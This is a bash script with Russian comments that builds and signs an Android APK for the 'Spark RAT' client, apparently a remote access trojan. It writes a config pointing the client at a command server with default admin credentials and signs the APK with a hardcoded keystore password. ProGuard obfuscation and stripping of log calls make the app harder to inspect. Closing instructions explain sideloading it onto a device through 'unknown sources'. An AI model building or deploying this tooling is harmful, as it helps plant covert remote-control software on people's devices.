#!/bin/bash

# Скрипт для сборки Android APK
# Использование: ./build_android.sh

set -e

echo "=== Android APK Builder ==="

# Проверяем зависимости
echo "Проверка зависимостей..."

if ! command -v java &> /dev/null; then
    echo "❌ Java не найден. Установите JDK 8+"
    exit 1
fi

if [ -z "$ANDROID_HOME" ]; then
    echo "❌ ANDROID_HOME не установлен"
    echo "Установите Android SDK и установите переменную ANDROID_HOME"
    exit 1
fi

if [ ! -d "$ANDROID_HOME/platforms/android-34" ]; then
    echo "❌ Android API 34 не найден. Установите Android API 34+"
    exit 1
fi

if [ ! -d "$ANDROID_HOME/build-tools" ]; then
    echo "❌ Android Build Tools не найдены"
    exit 1
fi

echo "✅ Все зависимости найдены"

# Создаем директорию для сборки
BUILD_DIR="build_output"
mkdir -p "$BUILD_DIR"

# Настройки сборки
APP_ID="com.spark.android"
VERSION_CODE="1"
VERSION_NAME="1.0.0"
OUTPUT_APK="$BUILD_DIR/spark-android-release.apk"

echo "Настройки сборки:"
echo "  APP_ID: $APP_ID"
echo "  VERSION: $VERSION_NAME ($VERSION_CODE)"
echo "  OUTPUT: $OUTPUT_APK"

# Создаем временный проект
TEMP_PROJECT="temp_android_project"
rm -rf "$TEMP_PROJECT"
cp -r android_template "$TEMP_PROJECT"

cd "$TEMP_PROJECT"

# Генерируем SparkConfig.java
echo "Генерация конфигурации..."
cat > app/src/main/java/com/spark/android/SparkConfig.java << EOF
package com.spark.android;

public class SparkConfig {
    // Конфигурация для Spark RAT Android клиента
    public static final String SERVER_URL = "http://192.168.1.100:8000"; // Измените на ваш сервер
    public static final String USERNAME = "admin"; // Измените на ваш логин
    public static final String PASSWORD = "password"; // Измените на ваш пароль
    public static final String DEVICE_NAME = "Android Device";
    public static final String DEVICE_ID = "generated-device-id";
    public static final String ARCH = "arm64";
}
EOF

# Обновляем build.gradle с правильным APP_ID
sed -i "s/applicationId \"com.spark.android\"/applicationId \"$APP_ID\"/" app/build.gradle
sed -i "s/versionCode 1/versionCode $VERSION_CODE/" app/build.gradle
sed -i "s/versionName \"1.0\"/versionName \"$VERSION_NAME\"/" app/build.gradle

# Создаем keystore для подписи (если не существует)
KEYSTORE_FILE="../$BUILD_DIR/spark-release-key.keystore"
if [ ! -f "$KEYSTORE_FILE" ]; then
    echo "Создание keystore для подписи..."
    keytool -genkey -v \
        -keystore "$KEYSTORE_FILE" \
        -alias spark-key \
        -keyalg RSA \
        -keysize 2048 \
        -validity 10000 \
        -storepass android123 \
        -keypass android123 \
        -dname "CN=Spark RAT, OU=Development, O=Spark, L=City, S=State, C=US"
fi

# Добавляем конфигурацию подписи в build.gradle
cat >> app/build.gradle << EOF

android {
    signingConfigs {
        release {
            storeFile file('../../$BUILD_DIR/spark-release-key.keystore')
            storePassword 'android123'
            keyAlias 'spark-key'
            keyPassword 'android123'
        }
    }
    
    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.release
        }
    }
}
EOF

# Создаем proguard-rules.pro
cat > app/proguard-rules.pro << EOF
# Keep Spark classes
-keep class com.spark.android.** { *; }

# Keep OkHttp classes
-keep class okhttp3.** { *; }
-dontwarn okhttp3.**

# Keep JSON classes
-keep class org.json.** { *; }
-dontwarn org.json.**

# General optimization
-optimizationpasses 5
-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-verbose

# Remove logging
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
}
EOF

# Собираем APK
echo "Сборка APK..."
if command -v ./gradlew &> /dev/null; then
    chmod +x ./gradlew
    ./gradlew assembleRelease
else
    echo "Используем системный gradle..."
    gradle assembleRelease
fi

# Копируем готовый APK
if [ -f "app/build/outputs/apk/release/app-release.apk" ]; then
    cp app/build/outputs/apk/release/app-release.apk "$OUTPUT_APK"
    echo "✅ APK успешно создан: $OUTPUT_APK"
    
    # Показываем информацию о файле
    ls -lh "$OUTPUT_APK"
    
    # Вычисляем SHA256
    if command -v sha256sum &> /dev/null; then
        echo "SHA256: $(sha256sum "$OUTPUT_APK" | cut -d' ' -f1)"
    elif command -v shasum &> /dev/null; then
        echo "SHA256: $(shasum -a 256 "$OUTPUT_APK" | cut -d' ' -f1)"
    fi
else
    echo "❌ Ошибка при сборке APK"
    exit 1
fi

# Очищаем временные файлы
cd ..
rm -rf "$TEMP_PROJECT"

echo ""
echo "=== Сборка завершена ==="
echo "APK файл: $OUTPUT_APK"
echo ""
echo "Инструкции по установке:"
echo "1. Включите 'Неизвестные источники' в настройках Android"
echo "2. Установите APK: adb install $OUTPUT_APK"
echo "3. Или скопируйте файл на устройство и установите вручную"
echo ""
echo "Для подключения к серверу:"
echo "1. Убедитесь что устройство и сервер в одной сети"
echo "2. Измените SERVER_URL в SparkConfig.java если нужно"
echo "3. Пересоберите APK с новыми настройками"